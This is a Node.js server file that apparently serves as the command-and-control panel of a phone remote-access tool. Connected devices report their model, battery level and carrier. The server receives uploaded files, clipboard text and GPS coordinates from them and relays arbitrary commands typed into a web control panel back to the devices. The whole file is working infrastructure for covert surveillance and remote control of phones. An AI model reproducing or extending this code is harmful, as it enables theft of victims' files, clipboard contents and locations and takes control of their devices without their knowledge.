const express = require('express');
const http = require('http');
const webSocket = require('ws');
const uuid4 = require('uuid').v4;
const multer = require('multer');
const bodyParser = require('body-parser');

const app = express();
const server = http.createServer(app);

// Initialize a single WebSocket server
const wss = new webSocket.Server({ server });

// --- Middleware Setup ---
// Serve static files (HTML, CSS, JS) from the 'public' folder
app.use(express.static('public'));
// Configure multer for file uploads and body-parser for text data
const upload = multer();
app.use(bodyParser.json());

// --- In-Memory Storage ---
// A Map to store connected device clients (key: uuid, value: device info)
const deviceClients = new Map();
// A Set to store all connected web panel clients
let panelClients = new Set();

// --- Helper Functions ---
/**
 * Broadcasts a message to all connected web control panels.
 * @param {object} data The data object to be sent as a JSON string.
 */
function broadcastToPanels(data) {
    const message = JSON.stringify(data);
    panelClients.forEach(panelWs => {
        if (panelWs.readyState === webSocket.OPEN) {
            panelWs.send(message);
        }
    });
}

// --- HTTP Routes for Data Upload from Devices ---

// Serve the main control panel page
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

// Endpoint for file uploads
app.post("/uploadFile", upload.single('file'), (req, res) => {
    const { model, uuid } = req.headers;
    console.log(`Receiving file from ${model || 'unknown device'}`);
    broadcastToPanels({
        type: 'file_received',
        payload: {
            uuid: uuid,
            deviceName: deviceClients.get(uuid)?.model || model,
            filename: req.file.originalname,
            message: `Received file '${req.file.originalname}' from ${model}.`
        }
    });
    res.status(200).send('File upload acknowledged.');
});

// Endpoint for text uploads (e.g., clipboard)
app.post("/uploadText", (req, res) => {
    const { model, uuid } = req.headers;
    console.log(`Receiving text from ${model || 'unknown device'}`);
    broadcastToPanels({
        type: 'text_received',
        payload: {
            uuid: uuid,
            deviceName: deviceClients.get(uuid)?.model || model,
            text: req.body['text']
        }
    });
    res.status(200).send('Text received.');
});

// Endpoint for location uploads
app.post("/uploadLocation", (req, res) => {
    const { model, uuid } = req.headers;
    console.log(`Receiving location from ${model || 'unknown device'}`);
    broadcastToPanels({
        type: 'location_received',
        payload: {
            uuid: uuid,
            deviceName: deviceClients.get(uuid)?.model || model,
            lat: req.body['lat'],
            lon: req.body['lon']
        }
    });
    res.status(200).send('Location received.');
});


// --- Main WebSocket Connection Logic ---
wss.on('connection', (ws, req) => {
    const connectionUrl = req.url;

    // --- Handle Control Panel Connections ---
    if (connectionUrl === '/panel') {
        console.log('✅ Control Panel connected.');
        panelClients.add(ws);

        // Send the current list of devices to the newly connected panel
        const deviceList = Array.from(deviceClients.values()).map(d => ({...d, ws: undefined}));
        ws.send(JSON.stringify({ type: 'initial_device_list', payload: deviceList }));

        // Listen for commands from the panel
        ws.on('message', (message) => {
            try {
                const data = JSON.parse(message);
                if (data.type === 'command') {
                    const { uuid, command } = data.payload;
                    const deviceClient = deviceClients.get(uuid);
                    if (deviceClient && deviceClient.ws.readyState === webSocket.OPEN) {
                        deviceClient.ws.send(command);
                        console.log(`🚀 Sent command '${command}' to ${deviceClient.model}`);
                    }
                }
            } catch (error) {
                console.error('Failed to process message from panel:', error);
            }
        });

        // Clean up when panel disconnects
        ws.on('close', () => {
            console.log('❌ Control Panel disconnected.');
            panelClients.delete(ws);
        });
        return; // End execution for panel client
    }

    // --- Handle Device Connections (Default) ---
    const uuid = uuid4();
    const { model, battery, version, brightness, provider } = req.headers;

    const deviceInfo = { ws, uuid, model, battery, version, brightness, provider };
    deviceClients.set(uuid, deviceInfo);

    console.log(`📱 Device connected: ${model} | UUID: ${uuid}`);

    // Notify all panels of the new device connection
    const broadcastPayload = { uuid, model, battery, version, brightness, provider };
    broadcastToPanels({ type: 'device_connected', payload: broadcastPayload });

    // Handle messages received from the device
    ws.on('message', (message) => {
        console.log(`[${model}]: ${message}`);
        // Forward device messages to panels as logs
        broadcastToPanels({
            type: 'device_log',
            payload: {
                uuid,
                deviceName: model,
                message: message.toString()
            }
        });
    });

    // Handle device disconnection
    ws.on('close', () => {
        console.log(`🔌 Device disconnected: ${model} | UUID: ${uuid}`);
        deviceClients.delete(uuid);
        // Notify all panels of the disconnection
        broadcastToPanels({ type: 'device_disconnected', payload: { uuid } });
    });
});

// --- Start the Server ---
const PORT = process.env.PORT || 8999;
server.listen(PORT, () => {
    console.log(`Server is live and listening on http://localhost:${PORT}`);
});
